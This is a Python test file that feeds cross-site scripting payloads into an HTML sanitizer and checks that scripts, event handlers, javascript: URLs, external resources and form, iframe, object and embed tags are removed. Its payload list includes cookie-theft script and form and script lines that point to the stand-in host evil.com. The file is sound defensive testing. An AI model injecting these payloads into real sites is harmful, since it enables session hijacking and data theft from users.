"""
Security tests: XSS payloads through the sanitizer and artifact viewer chain.
These tests verify that hostile HTML cannot escape the sanitization layer.
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../.."))

import pytest
from backend.agents.artifact_agent import sanitize_html


XSS_PAYLOADS = [
    # Classic script injection
    ('<script>alert("XSS")</script>', 'script tag'),
    ('<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>', 'uppercase script tag'),
    ('<script>document.cookie="stolen="+document.cookie</script>', 'cookie theft'),

    # Event handler injection
    ('<img src="x" onerror="alert(1)">', 'onerror handler'),
    ('<div onmouseover="evil()">hover me</div>', 'onmouseover handler'),
    ('<input onfocus="steal()" autofocus>', 'onfocus handler'),
    ('<body onload="attack()">', 'onload handler'),

    # JavaScript URL
    ('<a href="javascript:alert(1)">click me</a>', 'javascript: URL in href'),
    ('<a href="JAVASCRIPT:void(0)">link</a>', 'uppercase JAVASCRIPT URL'),

    # Data URL with script
    ('<a href="data:text/html,<script>alert(1)</script>">data</a>', 'data: URL'),

    # External resources
    ('<img src="http://evil.com/tracker.gif">', 'external image'),
    ('<link rel="stylesheet" href="http://evil.com/steal.css">', 'external CSS'),

    # Form injection
    ('<form action="http://evil.com/steal" method="POST"><input></form>', 'form exfil'),

    # Iframe injection
    ('<iframe src="http://evil.com"></iframe>', 'iframe'),

    # Object/embed
    ('<object data="http://evil.com/evil.swf"></object>', 'object tag'),
    ('<embed src="http://evil.com/evil.swf">', 'embed tag'),

    # SVG with script
    ('<svg onload="alert(1)"><animateTransform onbegin="alert(1)"/></svg>', 'SVG onload'),

    # CSS expression (IE)
    ('<div style="width:expression(alert(1))">test</div>', 'CSS expression'),

    # HTML entity obfuscation (these should be stripped or escaped)
    ('&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', 'HTML entity obfuscated script'),
]

SHOULD_SURVIVE = [
    # Structural formatting that SHOULD survive sanitization
    ('<p>Hello world</p>', 'paragraph'),
    ('<strong>Bold text</strong>', 'bold'),
    ('<em>Italic text</em>', 'italic'),
    ('<h2>Heading</h2>', 'heading'),
    ('<ul><li>Item 1</li><li>Item 2</li></ul>', 'list'),
    ('<blockquote>Quote</blockquote>', 'blockquote'),
    ('<code>code snippet</code>', 'code'),
    ('<a href="https://example.com">safe link</a>', 'safe https link'),
]


class TestHTMLSanitizer:
    def test_script_tags_removed(self):
        for payload, name in XSS_PAYLOADS[:3]:
            result = sanitize_html(payload)
            assert '<script' not in result.lower(), f"Script tag survived: {name}\nInput: {payload}\nOutput: {result}"
            assert 'alert(' not in result, f"alert() survived: {name}"

    def test_event_handlers_removed(self):
        for payload, name in XSS_PAYLOADS[3:7]:
            result = sanitize_html(payload)
            # No on* attributes should survive
            import re
            handlers = re.findall(r'\bon\w+\s*=', result, re.IGNORECASE)
            assert len(handlers) == 0, f"Event handler survived: {name}\nHandlers: {handlers}\nOutput: {result}"

    def test_javascript_urls_blocked(self):
        for payload, name in XSS_PAYLOADS[7:9]:
            result = sanitize_html(payload)
            assert 'javascript:' not in result.lower(), f"javascript: URL survived: {name}\nOutput: {result}"

    def test_external_resources_blocked(self):
        for payload, name in XSS_PAYLOADS[10:12]:
            result = sanitize_html(payload)
            assert 'http://evil.com' not in result, f"External resource survived: {name}\nOutput: {result}"

    def test_dangerous_tags_removed(self):
        for payload, name in [
            ('<form action="x">test</form>', 'form'),
            ('<iframe src="x"></iframe>', 'iframe'),
            ('<object data="x"></object>', 'object'),
            ('<embed src="x">', 'embed'),
        ]:
            result = sanitize_html(payload)
            tag = payload.split('<')[1].split(' ')[0].split('>')[0].lower()
            assert f'<{tag}' not in result.lower(), f"Dangerous tag survived: {name}\nOutput: {result}"

    def test_safe_formatting_preserved(self):
        for content, name in SHOULD_SURVIVE:
            result = sanitize_html(content)
            # Should not be completely empty
            assert len(result.strip()) > 0, f"Safe content was stripped: {name}\nInput: {content}\nOutput: {result}"

    def test_empty_string_safe(self):
        result = sanitize_html('')
        assert result == '' or result.strip() == ''

    def test_plain_text_preserved(self):
        text = "Hello world, this is plain text with no HTML."
        result = sanitize_html(text)
        assert 'Hello world' in result

    def test_nested_xss_attempt(self):
        """Layered/nested injection attempts."""
        payload = '<div><p onerror="alert(1)"><script>evil()</script></p></div>'
        result = sanitize_html(payload)
        assert '<script' not in result.lower()
        assert 'onerror' not in result.lower()
        assert 'evil()' not in result
